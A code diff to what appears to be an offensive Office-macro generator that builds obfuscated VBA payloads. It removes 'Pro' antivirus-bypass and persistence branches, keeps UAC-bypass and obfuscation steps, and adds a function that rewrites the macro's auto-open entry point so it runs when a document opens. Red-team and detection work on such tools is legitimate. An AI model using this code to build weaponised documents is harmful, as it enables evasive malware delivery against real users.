@@ -2,7 +2,7 @@
 # encoding: utf-8
 
 import logging
-from modules.mp_generator import Generator
+from modules.payload_builder import PayloadBuilder
 import shutil
 import os
 from modules.obfuscate_names import ObfuscateNames
@@ -10,17 +10,9 @@ from modules.obfuscate_form import ObfuscateForm
 from modules.obfuscate_strings import ObfuscateStrings
 from modules.uac_bypass import UACBypass
 from vbLib import WriteBytes
-try:
-    from pro_modules.vbom_encode import VbomEncoder
-    from pro_modules.persistance import Persistance
-    from pro_modules.background import Background
-    from pro_modules.av_bypass import AvBypass
-    
-except:
-    pass
 
 
-class VBAGenerator(Generator):
+class VBAGenerator(PayloadBuilder):
     """ Module used to generate VBA file from working dir content"""
     
           
@@ -30,7 +22,8 @@ class VBAGenerator(Generator):
         """
         logging.info("   [-] Embedding file %s..." % self.embeddedFilePath)
         if not os.path.isfile(self.embeddedFilePath):
-            logging.warning("   [!] Could not find %s! " % self.embeddedFilePath)
+            logging.error("   [!] Could not find %s " % self.embeddedFilePath)
+            raise Exception("Invalid file path")
             return
         
         infile = open(self.embeddedFilePath, 'rb')
@@ -84,21 +77,12 @@ class VBAGenerator(Generator):
     
     
         
-    def runObfuscators(self):
+    def vbTransformAndObfuscate(self):
         """ 
         Call this method to apply transformation and obfuscation on the content of temp directory 
         This method does obfuscation for all VBA and VBA like types
         
         """
-        if self.mpSession.mpType == "Pro":
-            if self.mpSession.avBypass:
-                avBypasser = AvBypass(self.mpSession)
-                avBypasser.runPreObfuscation()
-            
-            # MAcro to run in background    
-            if self.mpSession.background:
-                transformator = Background(self.mpSession)
-                transformator.run() 
         
         # Enable UAC bypass
         if self.mpSession.uacBypass:
@@ -117,43 +101,12 @@ class VBAGenerator(Generator):
         if self.mpSession.obfuscateForm:
             obfuscator = ObfuscateForm(self.mpSession)
             obfuscator.run() 
-        if self.mpSession.mpType == "Pro":
-                
-            # MAcro encoding    
-            if self.mpSession.vbomEncode:
-                obfuscator = VbomEncoder(self.mpSession)
-                obfuscator.run() 
-                
-                # PErsistance management
-                if self.mpSession.persist:
-                    obfuscator = Persistance(self.mpSession)
-                    obfuscator.run() 
-                
-                # Macro obfuscation second round
-                if self.mpSession.obfuscateNames:
-                    obfuscator = ObfuscateNames(self.mpSession)
-                    obfuscator.run()
-                # Mask strings
-                if self.mpSession.obfuscateStrings:
-                    obfuscator = ObfuscateStrings(self.mpSession)
-                    obfuscator.run()
-                # Macro obfuscation
-                if self.mpSession.obfuscateForm:
-                    obfuscator = ObfuscateForm(self.mpSession)
-                    obfuscator.run() 
-            else:
-                # PErsistance management
-                if self.mpSession.persist:
-                    obfuscator = Persistance(self.mpSession)
-                    obfuscator.run() 
-            
-            #macro split
-            if self.mpSession.avBypass:
-                avBypasser = AvBypass(self.mpSession)
-                avBypasser.runPostObfuscation()
+
+
     
     def check(self):
         return True
+    
     
     def printFile(self):
         """ Display generated code on stdout """
@@ -183,4 +136,27 @@ class VBAGenerator(Generator):
                     logging.info("   [-] Generated VBA file: %s" % os.path.join(os.path.dirname(self.outputFilePath),os.path.basename(vbaFile)))   
                     
                     
-                
+    def resetVBAEntryPoint(self):
+        """
+        If macro has an autoopen like mechanism, this will replace the entry_point with what is given in newEntrPoin param
+        Ex for Excel it will replace "Sub AutoOpen ()" with "Sub Workbook_Open ()"
+        """
+        mainFile = self.getMainVBAFile()
+        if mainFile != "" and  self.startFunction is not None:
+            if self.startFunction != self.getAutoOpenVbaFunction():
+                logging.info("   [-] Changing auto open function from %s to %s..." % (self.startFunction, self.getAutoOpenVbaFunction()))
+                #1 Replace line in VBA
+                f = open(mainFile)
+                content = f.readlines()
+                f.close
+                for n,line in enumerate(content):
+                    if line.find(" " + self.startFunction) != -1:  
+                        #logging.info("     -> %s becomes %s" %(content[n], self.getAutoOpenVbaSignature()))  
+                        content[n] = self.getAutoOpenVbaSignature() + "\n"
+                f = open(mainFile, 'w')
+                f.writelines(content)
+                f.close()   
+                # 2 Change  cure module start function
+                self._startFunction = self.getAutoOpenVbaFunction()
+                            
+    
